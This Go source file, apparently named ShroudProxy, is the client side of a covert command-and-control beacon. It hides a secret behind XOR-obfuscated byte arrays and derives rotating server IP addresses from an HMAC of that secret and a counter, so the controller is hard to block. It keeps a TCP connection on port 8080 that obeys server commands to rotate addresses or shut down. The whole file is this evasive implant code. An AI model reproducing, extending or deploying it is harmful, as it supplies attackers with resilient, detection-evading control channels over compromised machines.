// 
// ShroudProxy
// 	Daniel Ostrow
//		2024
//

package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

// Secret parts (same as before)
var a = []byte{111, 110, 98, 38, 37, 85, 65, 110}
var b = []byte{80, 50, 104, 56, 119, 47, 58, 70}
var c = []byte{33, 38, 102, 72, 75, 44, 105, 104}
var d = []byte{60, 67, 42, 99, 84, 99, 79, 77}
var e = []byte{36, 93, 100, 94, 87, 111, 112, 72}
var f = []byte{122, 88, 97, 116, 116, 82, 70, 76}
var g = []byte{122, 41, 97, 123, 39, 98, 73, 122}
var h = []byte{80, 57, 95, 46, 98, 63, 59}

// XOR key parts (same as before)
var x = []byte("Xk12Pa")
var y = []byte("Ym7pLz")

// XOR encrypt/decrypt function (same as before)
func xorEncryptDecrypt(input []byte, key []byte) []byte {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

// Construct the full secret dynamically
func GetSecret() []byte {
	secret := append(a, b...)
	secret = append(secret, c...)
	secret = append(secret, d...)
	secret = append(secret, e...)
	secret = append(secret, f...)
	secret = append(secret, g...)
	secret = append(secret, h...)

	return xorEncryptDecrypt(secret, append(x, y...))
}

// Generate the full IP address from secret and counter
func GenerateFullIP(secret []byte, counter uint64) string {
    counterBytes := make([]byte, 8)
    binary.BigEndian.PutUint64(counterBytes, counter)

    hash := hmac.New(sha1.New, secret)
    hash.Write(counterBytes)
    hmacResult := hash.Sum(nil)

    ipSegment1 := int(hmacResult[0]%254) + 1
    ipSegment2 := int(hmacResult[1]%254) + 1
    ipSegment3 := int(hmacResult[2]%254) + 1
    ipSegment4 := int(hmacResult[3]%254) + 1

    generatedIP := fmt.Sprintf("%d.%d.%d.%d", ipSegment1, ipSegment2, ipSegment3, ipSegment4)

    // Check if the IP is in the multicast range (224.0.0.0/4) and avoid it
    if ipSegment1 >= 224 && ipSegment1 <= 239 {
        fmt.Println("Generated IP falls in multicast range, regenerating...")
        return GenerateFullIP(secret, counter+1) // Increment the counter and try again
    }

    return generatedIP
}

// Start the beacon connection and keep it alive
func StartBeacon() {
	// Use a deterministic counter instead of a time-based counter
	counter := getSessionCounter()
	secret := GetSecret()

	// Connect using the generated IP
	for {
		generatedIP := GenerateFullIP(secret, counter)
		fmt.Printf("Beacon generated IP: %s\n", generatedIP)
	
		// Try to connect to the server
		conn, err := net.Dial("tcp", generatedIP+":8080")
		if err != nil {
			fmt.Printf("Error: Could not connect to Proxy at IP: %s. Error details: %v\n", generatedIP, err)
			time.Sleep(5 * time.Second)
			continue
		}
	
		fmt.Printf("Successfully connected to Proxy at IP: %s\n", generatedIP)
		defer conn.Close()

		// Keep the connection alive and listen for commands
		reader := bufio.NewReader(conn)
		for {
			// Wait for a command from the server
			message, err := reader.ReadString('\n')
			if err != nil {
				fmt.Println("Error reading from server:", err)
				conn.Close() // Close connection if error occurs
				break
			}

			// Process the message/command from the server
			message = strings.TrimSpace(message)
			switch message {
			case "change_counter":
				fmt.Println("Received command to change counter.")
				counter = changeCounter(counter)

			case "apply_change":
				fmt.Println("Received command to apply IP change.")
				conn.Close() // Close the current connection

				// Wait for 15 seconds before reconnecting to ensure the server is ready
				fmt.Println("Waiting for 15 seconds before reconnecting...")
				time.Sleep(15 * time.Second)

				goto reconnect // Force reconnection using the new IP

			case "kill":
				fmt.Println("Received kill command. Exiting...")
				conn.Close()
				return

			default:
				fmt.Printf("Received unknown command: %s\n", message)
			}
		}

	reconnect:
		fmt.Println("Reconnecting with new IP...")
		// Wait a bit longer to ensure server-side listener is fully initialized
		time.Sleep(5 * time.Second)
	}
}

// getSessionCounter can be fixed or synchronized with the server
func getSessionCounter() uint64 {
	return 42 // This should match the server's counter mechanism
}

// changeCounter simulates a counter change triggered by the server
func changeCounter(currentCounter uint64) uint64 {
	return currentCounter + 1
}

// Main function, entry point of the program
func main() {
	// Start the beacon connection and keep it alive
	StartBeacon()
}
